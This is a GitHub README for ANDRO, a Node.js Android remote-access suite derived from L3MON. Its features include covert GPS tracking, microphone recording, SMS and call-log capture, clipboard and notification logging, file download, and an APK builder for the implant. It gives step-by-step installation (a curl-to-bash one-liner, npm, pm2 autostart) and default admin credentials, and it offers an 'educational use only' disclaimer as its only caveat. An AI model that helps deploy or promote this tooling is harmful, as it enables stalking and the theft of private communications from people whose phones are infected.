
<p align="center">
<img src="https://github.com/AryanVBW/ANDRO/releases/download/A1/andro__5_-removebg-preview.png" height="100"><br>
A cloud based remote android managment suite, powered by Nodejs <img src="https://raw.githubusercontent.com/AryanVBW/ANDRO/main/nodejs%20(1).png" height="10">
</p>

>**Disclaimer** : This software or tool is meant for educational purposes only. we are not responsible for any malicious use of the app.



## Features
- GPS Logging📍
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs📞
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder


## Prerequisites 
 - Java Runtime Environment 8<img src="https://raw.githubusercontent.com/AryanVBW/ANDRO/main/java.png" height="30">
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - Any Linux distribution like:Kali,Arch  or [Android with LinuxDroid](https://github.com/AryanVBW/LinuxDroid) 
## 1click Installation (Recommended)
   Experience effortless installation with a single command. Simply copy and paste the following line into your terminal to automatically install all dependencies and have your ANDRO application up and running seamlessly
   
```bash
   curl -sSL https://github.com/AryanVBW/ANDRO/releases/download/1click/ANDRO1click.sh | bash
```
### 🚀 Quick Install 

Install globally using npm:

```bash
npm install -g andro-remote-suite
```

Or using npx (no installation required):

```bash
npx andro-remote-suite
```

### 📦 Local Installation
 
```bash
 wget https://github.com/AryanVBW/ANDRO/releases/download/1click/ANDRO1click.sh 
 chmod +x ANDRO1click.sh 
 sudo ./ANDRO1click.sh 
```
## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract the latest release from [HERE](https://github.com/AryanVBW/ANDRO/releases/download/v.1.0/ANDRO.zip)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run ANDRO on startup

6. Set a Username & Password
    1. Stop ANDRO `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text {Default is andro}
        - set the `password` as a LOWERCASE MD5 hash {default pass is admin}
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:8080`
8. `http://localhost:8080`
    
It's recommended to run ANDRO behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Contributor
   - J
## Demo Login page & Control Panel





<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/login.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/APK-Builder.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/Control-Panel.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/Device-Management.png" alt="Darkside"></a>

<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/Logs.png" alt="Darkside"></a>

<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/callhistory.png" alt="Darkside"></a>



<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/Files-Directories.png" alt="Darkside"></a>

<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/contact.png" alt="Darkside"></a>

<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/downlaods.png" alt="Darkside"></a>



<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/clipbord.png" alt="Darkside"></a>

<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/recoding.png" alt="Darkside"></a>

<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/permission.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/v.2.0_logo/gps.png" alt="Darkside"></a>
<img src="https://github.com/AryanVBW/ANDRO/releases/download/p1/controlpanel.gif">

<p align="center"> 
  Visitor count<br>
  <img src="https://profile-counter.glitch.me/Aryanvbw/count.svg" />
</p>

## Notes
When opening an issue, you **MUST** use the provided templates. Issues without this will not recieve support quickly and will be put to the bottom of the figurative pile.

Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0
## Thanks
ANDRO Builds off and utilizes serveral opensource softwares, Without these, ANDRO Wouldn't be what it is!
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)
 - L3MON by D3LV 
 
## Disclaimer
<b>Vivek W Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
ANDRO is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made 🕸️ By <a href="https://aryanvbw.github.io/">*Vivek W*</a></p>
<p align="center" style="font-size: 8px">v1.0</p>


